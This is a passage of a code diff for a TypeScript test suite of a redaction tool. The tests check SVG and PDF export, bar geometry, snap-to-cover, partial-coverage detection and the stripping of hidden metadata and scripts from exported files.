@@ -20,6 +20,7 @@ import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
 
 import { createRuntime } from '../engine/src/runtime.ts';
+import { needsBrowserTier } from '../shells/cli/src/run.ts';
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 const TOOL_DIR = join(ROOT, 'community/redact');
@@ -58,6 +59,58 @@ function loadGate(): any {
   return factory(BARE_HOST);
 }
 
+// The node-geometry maths (snap-to-cover, partial coverage) plus the inline-SVG
+// preparation and the node addressing. All pure — no DOM anywhere — which is
+// the whole point of keeping them in the hook rather than in the canvas script.
+function loadGeom(): any {
+  const factory = new Function(
+    'host',
+    `${HOOKS_SRC}\nreturn { rectTouches, unionBox, effBox, effectiveRect, snapBarToNodes,`
+    + ` subtractBox, uncoveredParts, partialNodes, parseNodeMarks, formatNodeMarks,`
+    + ` prepareInlineSvg, scopeCssRules, cleanSvgTokens, tokenize,`
+    + ` paintedShape, normaliseInk, inkContrast, stampFit, markStyleOf, stampTextFor,`
+    + ` shapePathD, isBackdropNode, markRadiusFor, quantiseBarsPt, NEUTRAL_INK };`
+  );
+  return factory(BARE_HOST);
+}
+
+// The template's @geom-mirror block, evaluated on its own. It has to be pure
+// (no DOM, no closure over the script above) for this to work at all — which is
+// itself part of what this pins.
+function loadTemplateGeom(): any {
+  const m = /@geom-mirror-start([\s\S]*?)@geom-mirror-end/.exec(TEMPLATE);
+  assert.ok(m, 'template.html still carries the @geom-mirror block');
+  // Drop the block's own leading comment tail ("… Keep it pure: … */") and the
+  // dangling opener of the closing marker's comment, which would otherwise be
+  // an unterminated comment.
+  const src = m![1]!.replace(/^[\s\S]*?\*\//, '').replace(/\/\*[^*]*$/, '');
+  return new Function(`${src}\nreturn RDGeom;`)();
+}
+
+// The template's @resnap-plan block: the decision about which bars still have
+// to be measured against the page. It runs on top of the mirror, so both blocks
+// are evaluated together. Pure by construction — jsdom answers every
+// getBoundingClientRect with zeroes, so the DOM wiring around this cannot be
+// tested off-browser, but the decision that can leak is exactly this.
+function loadTemplateResnap(): any {
+  const g = /@geom-mirror-start([\s\S]*?)@geom-mirror-end/.exec(TEMPLATE);
+  const r = /@resnap-plan-start([\s\S]*?)@resnap-plan-end/.exec(TEMPLATE);
+  assert.ok(r, 'template.html still carries the @resnap-plan block');
+  const strip = (s: string) => s.replace(/^[\s\S]*?\*\//, '').replace(/\/\*[^*]*$/, '');
+  return new Function(`${strip(g![1]!)}\n${strip(r![1]!)}\nreturn RDResnap;`)();
+}
+
+// The mirror's own effBox, so the re-snap cases probe with the same effective
+// rect the canvas does rather than a hand-rolled stand-in.
+let RESNAP_GEOM: any = null;
+const resnapGeom = (): any => (RESNAP_GEOM ||= loadTemplateGeom());
+
+// A drawn bar, as the canvas commits one: 'm' means measured with nothing under
+// it. Bars with no `n` at all are the "never measured" case vector export
+// refuses, and the tests that exercise that say so explicitly.
+const drawn = (x: number, y: number, w: number, h: number, over: any = {}): any =>
+  ({ page: 1, x, y, w, h, n: 'm', ...over });
+
 const fileRef = (name: string, mime: string, bytes: Uint8Array): any =>
   ({ __file: true, name, mime, size: bytes.length, bytes, url: null });
 
@@ -65,6 +118,10 @@ const fileRef = (name: string, mime: string, bytes: Uint8Array): any =>
 function modelFor(source: any, over: Record<string, any> = {}): any[] {
   const values: Record<string, any> = {
     source, bars: [], quantise: true, grayscale: false, svgVector: false, resign: false,
+    // The manifest defaults, so a test exercises what a user actually gets:
+    // 'branded' means a brand tone (the neutral ink with no brand loaded) and a
+    // slight corner radius, and fileKind is the hook's own write-back.
+    style: 'branded', stampLabel: '', fileKind: '',
     ...over,
   };
   return INPUT_IDS.map((id: string) => ({ id, value: values[id] }));
@@ -298,7 +355,9 @@ test('redact: vectorMode is true only for an SVG with the toggle on, and softens
     host: BARE_HOST,
   });
   assert.equal(svgOn.vectorMode, true);
-  assert.match(svgOn.coverageText, /will cover about \d+% of the frame\./);
+  // Vector mode DELETES what a bar touches now, so the copy says so — the old
+  // "covers, does not delete" wording would be the one false sentence left.
+  assert.match(svgOn.coverageText, /will delete what it touches and cover about \d+% of the frame\./);
   assert.doesNotMatch(svgOn.coverageText, /repaint/);
 
   // A stale svgVector=true with a raster file must NOT flip the copy.
@@ -326,6 +385,10 @@ test('redact: onInit/onInput never return a key matching a declared input id', a
     const input = await hooks.onInput({ id: 'quantise', value: true, model: modelFor(f), host: BARE_HOST });
     for (const patch of [init, input]) {
       for (const key of Object.keys(patch)) {
+        // fileKind is the ONE deliberate exception: showIf can only compare
+        // input values, so the sniffed format has to be published INTO the model
+        // for svgVector/resign to hide themselves on a file they don't apply to.
+        if (key === 'fileKind') continue;
         assert.ok(!INPUT_IDS.includes(key), `patch key "${key}" collides with an input id (file: ${f ? f.name : 'none'})`);
       }
     }
@@ -347,7 +410,7 @@ test('redact: hooks never mutate the input bytes', async () => {
   const beforeSvg = Array.from(svg);
   const fs = fileRef('art.svg', 'image/svg+xml', svg);
   await hooks.onInit({ model: modelFor(fs), host: BARE_HOST });
-  await hooks.exportFile({ model: modelFor(fs, { svgVector: true, bars: [{ page: 1, x: 20, y: 30, w: 50, h: 20 }] }), host: BARE_HOST });
+  await hooks.exportFile({ model: modelFor(fs, { svgVector: true, bars: [drawn(20, 30, 50, 20)] }), host: BARE_HOST });
   assert.deepEqual(Array.from(svg), beforeSvg);
 });
 
@@ -355,9 +418,12 @@ test('redact: hooks never mutate the input bytes', async () => {
 
 test('redact: SVG vector export removes metadata/comments/scripts and appends opaque bars', async () => {
   const hooks = loadHooks();
-  const bars = [{ page: 1, x: 20, y: 30, w: 50, h: 20 }];
+  const bars = [drawn(20, 30, 50, 20)];
+  // Solid style: square corners, so the exact rect geometry is readable here.
+  // The branded default's rounded shape is pinned separately, against the same
+  // square box grown by its own radius.
   const res = await hooks.exportFile({
-    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars }),
+    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars, style: 'solid' }),
     host: BARE_HOST,
   });
   assert.equal(res.mime, 'image/svg+xml');
@@ -373,8 +439,9 @@ test('redact: SVG vector export removes metadata/comments/scripts and appends op
   assert.match(out, /<text x="10" y="50">Visible caption<\/text>/);
   assert.match(out, /viewBox="0 0 200 100"/);
   // The bar: 20..70 x 30..50, inflated 2px each side, width quantised UP to the
-  // 24px grid (54 → 72, centred) → x 9, y 28, 72x24 — opaque black.
-  assert.match(out, /<rect x="9" y="28" width="72" height="24" fill="#000000" fill-opacity="1"\/>/);
+  // 24px grid (54 → 72, centred) → x 9, y 28, 72x24 — the neutral ink at full
+  // opacity (no brand is loaded on BARE_HOST, so the fallback stands in).
+  assert.match(out, /<rect x="9" y="28" width="72" height="24" fill="#14161a" fill-opacity="1"\/>/);
 });
 
 test('redact: SVG vector export works with no bars (still strips hidden data)', async () => {
@@ -614,13 +681,13 @@ test('redact: a root size with no resolvable value falls back to the viewBox so 
   <text x="380" y="300">SECRET</text>
 </svg>`;
     const res = await hooks.exportFile({
-      model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, bars: [{ page: 1, x: 380, y: 280, w: 80, h: 40 }] }),
+      model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, style: 'solid', bars: [drawn(380, 280, 80, 40)] }),
       host: BARE_HOST,
     });
     const out = new TextDecoder().decode(res.bytes);
     // 380..460 inflated 2px → 378..462 (w 84), quantised UP to 96, centred →
     // 372..468; y 280..320 → 278..322. Mapped 1:1 into the viewBox.
-    assert.match(out, /<rect x="372" y="278" width="96" height="44" fill="#000000" fill-opacity="1"\/>/, size || '(no width/height)');
+    assert.match(out, /<rect x="372" y="278" width="96" height="44" fill="#14161a" fill-opacity="1"\/>/, size || '(no width/height)');
   }
 });
 
@@ -634,7 +701,7 @@ test('redact: an absolute root size IS the natural size, and bars scale through 
   const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="210mm" height="157.5mm" viewBox="0 0 800 600">'
     + '<text x="380" y="300">SECRET</text></svg>';
   const res = await hooks.exportFile({
-    model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, bars: [{ page: 1, x: 380, y: 280, w: 80, h: 40 }] }),
+    model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { svgVector: true, style: 'solid', bars: [drawn(380, 280, 80, 40)] }),
     host: BARE_HOST,
   });
   const out = new TextDecoder().decode(res.bytes);
@@ -695,86 +762,33 @@ const TWO_PAGES = {
   truncated: false,
 };
 
-test('redact: pdfPages extras carry per-page preview URLs in PDF points (data-URL fallback)', async () => {
+test('redact: pdfPages extras carry INLINE per-page SVG markup in PDF points', async () => {
+  // The enabling change of this round: a page arrives as markup the template
+  // inlines, NOT as an <img src="blob:…">. An SVG inside an <img> is a closed
+  // document — nothing outside it can read a node's painted bounds — so
+  // snap-to-cover, the partial-coverage warning and vector deletion would all
+  // be impossible. The whole object-URL lifecycle (create, track, revoke on a
+  // delay) went with it: there is nothing left to revoke.
   const hooks = loadHooks();
-  const saved = (URL as any).createObjectURL;
-  (URL as any).createObjectURL = undefined; // force the data: fallback (node shells without object URLs)
-  try {
-    const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
-    const res = await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
-    assert.equal(res.hasPdfPages, true);
-    assert.equal(res.pagesPending, false);
-    assert.equal(res.pagesTruncated, false);
-    assert.equal(res.pagesError, '');
-    assert.equal(res.pdfPages.length, 2);
-    for (const [i, p] of res.pdfPages.entries()) {
-      assert.equal(p.page, i + 1);
-      assert.equal(p.w, 612);
-      assert.equal(p.h, 792);
-      assert.match(p.url, /^data:image\/svg\+xml;charset=utf-8,/);
-      assert.match(decodeURIComponent(p.url), new RegExp(`page ${i + 1}`));
-    }
-  } finally {
-    (URL as any).createObjectURL = saved;
-  }
-});
-
-// Retirement is DEFERRED (~1.5s): the runtime's pre-hook emit repaints the old
-// extras, so fresh <img> elements can still be loading the old blob URLs for a
-// beat after a new file lands. The tests wait the delay out.
-const RETIRE_WAIT_MS = 1700;
-const settleRetire = () => new Promise((r) => setTimeout(r, RETIRE_WAIT_MS));
-
-test('redact: page object URLs are retired (on a delay) when the file changes, and the guard tolerates a missing revoke', async () => {
-  const hooks = loadHooks();
-  const savedCreate = (URL as any).createObjectURL;
-  const savedRevoke = (URL as any).revokeObjectURL;
-  const revoked: string[] = [];
-  let n = 0;
-  (URL as any).createObjectURL = () => `blob:test-${++n}`;
-  (URL as any).revokeObjectURL = (u: string) => { revoked.push(u); };
-  try {
-    const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
-    await hooks.onInit({ model: modelFor(fileRef('doc-a.pdf', 'application/pdf', PDF_SRC)), host });
-    assert.equal(revoked.length, 0);
-    // A new file identity retires the previous job's URLs — but NOT
-    // immediately: the pre-hook repaint may still be loading them.
-    await hooks.onInit({ model: modelFor(fileRef('doc-b.pdf', 'application/pdf', PDF_SRC)), host });
-    assert.equal(revoked.length, 0, 'revocation is deferred past the repaint window');
-    await settleRetire();
-    assert.deepEqual(revoked, ['blob:test-1', 'blob:test-2']);
-    // No revokeObjectURL at all: the guard must not throw.
-    (URL as any).revokeObjectURL = undefined;
-    const res = await hooks.onInit({ model: modelFor(fileRef('doc-c.pdf', 'application/pdf', PDF_SRC)), host });
-    assert.equal(res.hasPdfPages, true);
-    // Drain doc-c's own retire timer while the missing-revoke guard is still
-    // in place, so it cannot fire into a later test's spy.
-    await settleRetire();
-  } finally {
-    (URL as any).createObjectURL = savedCreate;
-    (URL as any).revokeObjectURL = savedRevoke;
-  }
-});
-
-test('redact: replacing a PDF with an image retires the page URLs instead of leaking them', async () => {
-  const hooks = loadHooks();
-  const savedCreate = (URL as any).createObjectURL;
-  const savedRevoke = (URL as any).revokeObjectURL;
-  const revoked: string[] = [];
-  let n = 0;
-  (URL as any).createObjectURL = () => `blob:leak-${++n}`;
-  (URL as any).revokeObjectURL = (u: string) => { revoked.push(u); };
-  try {
-    const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
-    await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
-    assert.equal(revoked.length, 0);
-    // The replacement never enters the PDF branch — the reset must run anyway.
-    await hooks.onInit({ model: modelFor(fileRef('photo.png', 'image/png', buildDirtyPng())), host });
-    await settleRetire();
-    assert.deepEqual(revoked, ['blob:leak-1', 'blob:leak-2']);
-  } finally {
-    (URL as any).createObjectURL = savedCreate;
-    (URL as any).revokeObjectURL = savedRevoke;
+  const host = pdfHost({ pdf: { pages: async () => TWO_PAGES } });
+  const res = await hooks.onInit({ model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC)), host });
+  assert.equal(res.hasPdfPages, true);
+  assert.equal(res.pagesPending, false);
+  assert.equal(res.pagesTruncated, false);
+  assert.equal(res.pagesError, '');
+  assert.equal(res.pdfPages.length, 2);
+  for (const [i, p] of res.pdfPages.entries()) {
+    assert.equal(p.page, i + 1);
+    assert.equal(p.w, 612);
+    assert.equal(p.h, 792);
+    assert.equal(p.url, undefined, 'no object URL is minted any more');
+    assert.match(p.svg, /^<svg\b/, 'the page IS markup, ready to inline');
+    assert.match(p.svg, /viewBox="0 0 612 792"/, 'the viewBox stays PDF points');
+    assert.match(p.svg, /width="612" height="792"/, 'sized at the space bars are measured in');
+    assert.match(p.svg, /class="rd-img"/);
+    assert.match(p.svg, /data-rdsvg=""/, 'the scope hook the file\'s own CSS is rewritten under');
+    assert.match(p.svg, new RegExp(`page ${i + 1}`));
+    assert.match(p.svg, /<text[^>]*data-rdn="\d+"/, 'every element carries its token address');
   }
 });
 
@@ -848,7 +862,7 @@ test('redact: an incomplete (zero-area) bars row survives the canvas round-trip 
   });
   const roundTrip = JSON.parse(res.barsJson);
   assert.equal(roundTrip.length, 2, 'the half-typed row stays in the canvas array');
-  assert.deepEqual(roundTrip[0], { page: 1, x: 5, y: 5, w: 0, h: 0 });
+  assert.deepEqual(roundTrip[0], { page: 1, x: 5, y: 5, w: 0, h: 0, n: '' });
   // But it never counts as a real bar anywhere else.
   assert.equal(res.barCount, 1);
   assert.equal(res.hasBars, true);
@@ -911,8 +925,16 @@ test('redact (e2e): PDF pages render as frames in point space with the no-bars b
   assert.match(html, /class="rd-frame rd-pageframe" data-page="1" data-ptw="612" data-pth="792"/);
   assert.match(html, /class="rd-frame rd-pageframe" data-page="2"/);
   assert.match(html, /Page 2<\/span>/);
-  // The stage element carries the empty bars array plus the rail's preset map.
+  // Each page is INLINE svg in the frame, addressed for measurement — not an
+  // <img src="blob:…">, which would be a closed document with no readable node
+  // bounds and no snap-to-cover, warning or deletion on top of it.
+  assert.match(html, /<svg[^>]*class="rd-img"[^>]*data-rdsvg=""/);
+  assert.match(html, /<text[^>]*data-rdn="\d+"[^>]*>page 1<\/text>/);
+  assert.doesNotMatch(html, /<img class="rd-img"/);
+  // The stage element carries the empty bars array, the rail's preset map and
+  // the geometry constants the canvas mirror needs.
   assert.match(html, /class="rd-stage" data-bars="\[\]" data-presets="/);
+  assert.match(html, /data-geom="\{&quot;inflate&quot;:2/);
   // No bars yet: the download button is really disabled, with guidance as label.
   assert.match(html, /<button type="button" class="rd-download" data-export-file disabled>Draw a bar over what should go first<\/button>/);
 });
@@ -921,14 +943,15 @@ test('redact (e2e): exportFile through the runtime returns verified SVG bytes', 
   const rt = await createRuntime(redactTool(), BARE_HOST, {
     source: fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)),
     svgVector: true,
-    bars: [{ page: 1, x: 20, y: 30, w: 50, h: 20 }],
+    bars: [drawn(20, 30, 50, 20)],
+    style: 'solid',
   });
   const { bytes, mime, filename } = await rt.exportFile() as any;
   assert.equal(mime, 'image/svg+xml');
   assert.equal(filename, 'art-redacted.svg');
   const out = new TextDecoder().decode(bytes);
   assert.doesNotMatch(out, /<metadata|<script|hushtoken/);
-  assert.match(out, /fill="#000000"/);
+  assert.match(out, /fill="#14161a" fill-opacity="1"/);
 });
 
 // ─── advisory toasts: dedupe per file, one at a time ─────────────────────────
@@ -1148,8 +1171,16 @@ test('redact: the quantise toggle reaches the PDF rebuild, in points', async () 
   assert.ok(on.w >= 37, 'quantising only ever widens');
   assert.ok(on.x <= 100 && on.x + on.w >= 137, 'the original span stays fully inside the widened bar');
 
+  // Quantise off still hands over the EFFECTIVE rect, not the raw one: the
+  // preview draws the 2-unit inflation whatever the toggle says, and the rebuild
+  // inflates by two DEVICE pixels (0.72pt at 200 dpi), so leaving the inflation
+  // to the far side painted a bar several points narrower than the one on
+  // screen — area the user watched go black, shipped readable.
   await hooks.exportFile({ model: modelFor(src, { bars, quantise: false }), host });
-  assert.deepEqual(seen[1].bars, bars, 'off means the bars cross the bridge untouched');
+  assert.deepEqual(seen[1].bars, [{ page: 1, x: 98, y: 48, w: 41, h: 16 }],
+    'off drops the width grid, never the inflation');
+  // And the widened bar always contains the plain inflated one.
+  assert.ok(on.x <= 98 && on.x + on.w >= 139, 'the quantised bar contains the effective rect');
 });
 
 // ─── SVG vector mode: the bar must land where the browser drew it ────────────
@@ -1165,10 +1196,10 @@ test('redact: an SVG sized in physical units maps bars from the browser natural 
   const S = 96 / 25.4 * 210 / 100; // natural px per viewBox unit
   // A bar the user drew over SECRET (viewBox x 5..50, y 10..25), committed in
   // natural pixels the way template.html's frameSpace() reports them.
-  const bars = [{ page: 1, x: Math.round(5 * S), y: Math.round(10 * S), w: Math.round(45 * S), h: Math.round(15 * S) }];
+  const bars = [drawn(Math.round(5 * S), Math.round(10 * S), Math.round(45 * S), Math.round(15 * S))];
   const out = new TextDecoder().decode(
     (await hooks.exportFile({
-      model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { bars, svgVector: true }),
+      model: modelFor(fileRef('mm.svg', 'image/svg+xml', svgBytes(svg)), { bars, svgVector: true, style: 'solid' }),
       host: BARE_HOST,
     })).bytes
   );
@@ -1201,4 +1232,1041 @@ test('redact: bars left on other pages by a replaced PDF are reported, not silen
   assert.match(res.staleNote, /replaced/);
   assert.match(res.staleNote, /dropped from the export/);
   assert.equal(res.staleBars, 1);
+});
+
+// ─── node geometry: snap-to-cover, partial coverage (pure, no DOM) ───────────
+// The sandboxed hook cannot compute glyph geometry, so the canvas script
+// measures and the hook owns the maths. These pin the maths; the mirror test
+// below pins the two copies against each other.
+
+const box = (x: number, y: number, w: number, h: number) => ({ x, y, w, h });
+
+test('redact geom: a bar grows to the union of every node it touches, and keeps growing', () => {
+  const { snapBarToNodes } = loadGeom();
+
+  // The case Andy hit in the browser: a strikethrough-height bar across a word
+  // whose ascenders and descenders stick out. The bar must swallow the glyph
+  // box, not clip it.
+  const glyphs = box(10, 10, 60, 30);
+  const strike = { x: 20, y: 22, w: 30, h: 4 };
+  const snapped = snapBarToNodes(strike, [glyphs]);
+  assert.deepEqual(
+    { x: snapped.x, y: snapped.y, w: snapped.w, h: snapped.h },
+    { x: 10, y: 10, w: 60, h: 30 },
+    'the bar contains the whole glyph box'
+  );
+  assert.deepEqual(snapped.hit, [0]);
+
+  // Growth is transitive: reaching node 0 makes the bar reach node 1, which the
+  // original never touched. The deletion set has to be closed under that, or a
+  // covered element would survive in the vector output.
+  const chain = snapBarToNodes({ x: 0, y: 0, w: 2, h: 2 }, [
+    box(1, 1, 20, 5),   // touched directly (spans x 1..21)
+    box(21, 1, 20, 5),  // only reachable once the bar has grown out to 21
+    box(200, 200, 5, 5) // never reachable
+  ]);
+  assert.deepEqual(chain.hit, [0, 1]);
+  assert.equal(chain.x + chain.w, 41);
+
+  // Nothing to snap to (a raster source has no nodes at all) leaves the drawn
+  // bar exactly as drawn.
+  const alone = snapBarToNodes({ x: 5, y: 6, w: 7, h: 8 }, []);
+  assert.deepEqual({ x: alone.x, y: alone.y, w: alone.w, h: alone.h }, box(5, 6, 7, 8));
+  assert.deepEqual(alone.hit, []);
+});
+
+test('redact geom: snapping probes the PAINTED box, so inflation and quantise pull nodes in', () => {
+  const { snapBarToNodes, effBox } = loadGeom();
+  const W = 400, H = 200;
+  // A word sitting just outside the drawn bar, but inside the 2px inflation the
+  // export paints. It gets covered either way — so it must also be DELETED,
+  // which only happens if the probe is the painted box and not the raw drag.
+  const near = box(52, 10, 20, 10);
+  const raw = { x: 10, y: 10, w: 40, h: 10 };
+  assert.deepEqual(snapBarToNodes(raw, [near]).hit, [], 'raw box alone does not reach it');
+  const probed = snapBarToNodes(raw, [near], (b: any) => effBox(b, W, H, false));
+  assert.deepEqual(probed.hit, [0], 'the inflated painted box does');
+});
+
+test('redact geom: snap happens FIRST, the quantise grid then widens the already-snapped span', () => {
+  const { snapBarToNodes, effBox, effectiveRect } = loadGeom();
+  const W = 400, H = 200;
+  const word = box(20, 10, 100, 24);
+  const thin = { x: 40, y: 20, w: 10, h: 3 };
+
+  const snapped = snapBarToNodes(thin, [word], (b: any) => effBox(b, W, H, true));
+  const after = effectiveRect(snapped, W, H, true);
+
+  // Order matters and is observable: quantising the 10-wide drag first would
+  // round 14 up to 24 and the word would still be half naked. Snapping first
+  // gives a 104-wide span that the grid then rounds to 120.
+  assert.ok(after.x0 <= 20 && after.x1 >= 120, `the whole word is inside, got ${after.x0}..${after.x1}`);
+  assert.equal((after.x1 - after.x0) % 24, 0, 'the final width still lands on the grid');
+
+  const wrongOrder = effectiveRect(thin, W, H, true);
+  assert.ok(wrongOrder.x1 < 120, 'quantise-then-snap would have left the word exposed');
+});
+
+test('redact geom: partial coverage is exact, and the union of bars counts', () => {
+  const { partialNodes, uncoveredParts } = loadGeom();
+  const word = box(10, 10, 100, 20);
+
+  // Half covered: reported, with the exposed remainder named.
+  const half = partialNodes([word], [box(0, 0, 60, 40)]);
+  assert.equal(half.length, 1);
+  assert.equal(half[0].index, 0);
+  assert.deepEqual(half[0].parts, [{ x: 60, y: 10, w: 50, h: 20 }]);
+
+  // Fully covered by one bar: silent.
+  assert.deepEqual(partialNodes([word], [box(0, 0, 200, 200)]), []);
+
+  // Two bars that JOINTLY finish the word are not a partial coverage. Testing
+  // each bar on its own would have reported a leak that is not there.
+  assert.deepEqual(partialNodes([word], [box(0, 0, 60, 40), box(55, 0, 100, 40)]), []);
+
+  // Untouched nodes are never reported, however far from a bar.
+  assert.deepEqual(partialNodes([box(500, 500, 10, 10)], [box(0, 0, 60, 40)]), []);
+
+  // Antialiasing slivers are not readable content: a sub-unit remainder is
+  // dropped rather than nagged about.
+  assert.deepEqual(uncoveredParts(word, [box(10, 10, 99.9, 20)]), []);
+});
+
+test('redact geom: the template mirror and the hook agree, case by case', () => {
+  // template.html has to carry its own copy of the maths — the measuring
+  // happens where the DOM is, mid-gesture, and a sandboxed hook cannot be
+  // called there. This is the guard that stops the two drifting.
+  const hook = loadGeom();
+  const mirror = loadTemplateGeom();
+  const INFLATE = 2, GRID = 24, W = 300, H = 150;
+
+  const boxes = [
+    box(0, 0, 10, 10), box(5, 5, 10, 10), box(20, 0, 5, 40), box(-5, -5, 8, 8),
+    box(100, 100, 60, 20), box(0, 0, 300, 150), box(12.5, 7.25, 3.5, 2.75),
+  ];
+  for (const a of boxes) {
+    for (const b of boxes) {
+      assert.equal(mirror.rectTouches(a, b), hook.rectTouches(a, b), `rectTouches ${JSON.stringify([a, b])}`);
+      assert.deepEqual(mirror.unionBox(a, b), hook.unionBox(a, b), 'unionBox');
+      assert.deepEqual(mirror.subtractBox(a, b), hook.subtractBox(a, b), 'subtractBox');
+    }
+    for (const q of [true, false]) {
+      assert.deepEqual(
+        mirror.effBox(a, W, H, q, INFLATE, GRID),
+        hook.effBox(a, W, H, q),
+        `effBox ${JSON.stringify(a)} quantise=${q}`
+      );
+    }
+    assert.deepEqual(mirror.uncoveredParts(a, boxes, null), hook.uncoveredParts(a, boxes, null), 'uncoveredParts');
+  }
+  assert.deepEqual(mirror.partialNodes(boxes, [box(0, 0, 30, 30)], null),
+    hook.partialNodes(boxes, [box(0, 0, 30, 30)], null), 'partialNodes');
+
+  // The rounded-corner shape too: the preview claims to paint what the export
+  // burns, and this is the only thing making that claim true.
+  for (const a of boxes) {
+    const rect = { x0: a.x, y0: a.y, x1: a.x + a.w, y1: a.y + a.h };
+    for (const r of [0, 1, 3, 8, 40]) {
+      assert.deepEqual(
+        mirror.paintedShape(rect, r, W, H),
+        hook.paintedShape(rect, r, W, H),
+        `paintedShape ${JSON.stringify(rect)} radius=${r}`
+      );
+    }
+  }
+
+  for (const q of [true, false]) {
+    const effHook = (b: any) => hook.effBox(b, W, H, q);
+    const effMirror = (b: any) => mirror.effBox(b, W, H, q, INFLATE, GRID);
+    for (const seed of boxes) {
+      assert.deepEqual(
+        mirror.snapBarToNodes(seed, boxes, effMirror),
+        hook.snapBarToNodes(seed, boxes, effHook),
+        `snapBarToNodes ${JSON.stringify(seed)} quantise=${q}`
+      );
+    }
+  }
+});
+
+// ─── re-measuring bars this canvas did not draw ──────────────────────────────
+
+test('redact resnap: a bar that arrived unmeasured is snapped to cover and addressed', () => {
+  const resnap = loadTemplateResnap();
+  const { parseNodeMarks } = loadGeom();
+  const W = 300, H = 150, INFLATE = 2;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, INFLATE, 24);
+
+  // Two glyph boxes side by side, as an outlined PDF page or an SVG presents
+  // them. The bar is a strikethrough: it crosses both, finishes neither.
+  const nodes = [
+    { idx: 0, x: 10, y: 20, w: 40, h: 30 },
+    { idx: 1, x: 55, y: 20, w: 40, h: 30 },
+  ];
+  const thin: any = { page: 1, x: 12, y: 32, w: 80, h: 4 };   // no `n`: never measured
+
+  const out = resnap.plan([thin], 1, nodes, W, H, eff);
+  assert.equal(out.changed, true, 'an unmeasured bar is always re-measured');
+  const got = out.next[0];
+
+  // Snap-to-cover: the bar now contains both glyph boxes outright.
+  assert.ok(got.x <= 10 && got.y <= 20, 'grew up and left to the first glyph');
+  assert.ok(got.x + got.w >= 95 && got.y + got.h >= 50, 'grew down and right past the second');
+  // And it carries the addresses vector export deletes, in sorted order.
+  assert.deepEqual(parseNodeMarks(got.n), [0, 1]);
+  // The original array is never mutated — the caller commits the copy.
+  assert.equal(thin.n, undefined);
+  assert.equal((thin as any).w, 80);
+});
+
+test('redact resnap: a bar that already covers what it touches is left exactly alone', () => {
+  const resnap = loadTemplateResnap();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodes = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];
+
+  // Drawn on this canvas: measured, and containing its one node.
+  const settled = { page: 1, x: 5, y: 15, w: 55, h: 45, n: 'm:0' };
+  const out = resnap.plan([settled], 1, nodes, W, H, eff);
+  assert.equal(out.changed, false, 'no correction, so no commit and no history entry');
+  assert.equal(out.next[0], settled, 'the very same object, not a rewritten copy');
+});
+
+test('redact resnap: re-planning its own output changes nothing (no creep)', () => {
+  const resnap = loadTemplateResnap();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  // A row of glyphs close enough that a careless pass could keep absorbing
+  // neighbours one render at a time.
+  const nodes = [0, 1, 2, 3].map((i) => ({ idx: i, x: 10 + i * 25, y: 20, w: 20, h: 30 }));
+
+  const first = resnap.plan([{ page: 1, x: 12, y: 32, w: 30, h: 4 }], 1, nodes, W, H, eff);
+  assert.equal(first.changed, true);
+  // The fixed point has to be reached in ONE pass: every later render calls
+  // this again, and a second correction would be a second undo entry.
+  const second = resnap.plan(first.next, 1, nodes, W, H, eff);
+  assert.equal(second.changed, false, 'settled after one correction');
+  const third = resnap.plan(second.next, 1, nodes, W, H, eff);
+  assert.equal(third.changed, false);
+});
+
+test('redact resnap: a measured bar that leaves a node partly covered is grown', () => {
+  const resnap = loadTemplateResnap();
+  const { parseNodeMarks } = loadGeom();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodes = [{ idx: 0, x: 10, y: 20, w: 90, h: 30 }];
+
+  // Measured once, then edited in the sidebar until it only half-covers the
+  // node. The stale `n` is not evidence of coverage, so this must not be
+  // trusted just because it says 'm'.
+  const shrunk = { page: 1, x: 10, y: 20, w: 30, h: 30, n: 'm:0' };
+  const out = resnap.plan([shrunk], 1, nodes, W, H, eff);
+  assert.equal(out.changed, true, 'a stale bar that leaks is re-measured');
+  assert.ok(out.next[0].x + out.next[0].w >= 100, 'grown to finish the node');
+  assert.deepEqual(parseNodeMarks(out.next[0].n), [0]);
+});
+
+test('redact resnap: other pages, zero-area rows and raster frames are untouched', () => {
+  const resnap = loadTemplateResnap();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodes = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];
+
+  // A bar belonging to page 2 is not this frame's to measure, and an
+  // in-progress zero-area row survives the pass intact (it round-trips through
+  // the canvas as-is).
+  const bars = [
+    { page: 2, x: 12, y: 32, w: 80, h: 4 },
+    { page: 1, x: 0, y: 0, w: 0, h: 0 },
+  ];
+  assert.equal(resnap.plan(bars, 1, nodes, W, H, eff).changed, false);
+
+  // Flat pixels have no elements, so neither snap-to-cover nor the addresses
+  // can exist there — and the tool's copy says exactly that.
+  assert.equal(resnap.plan([{ page: 1, x: 12, y: 32, w: 80, h: 4 }], 1, [], W, H, eff).changed, false);
+});
+
+test('redact resnap: a corrected bar keeps every field the row carried', () => {
+  const resnap = loadTemplateResnap();
+  const W = 300, H = 150;
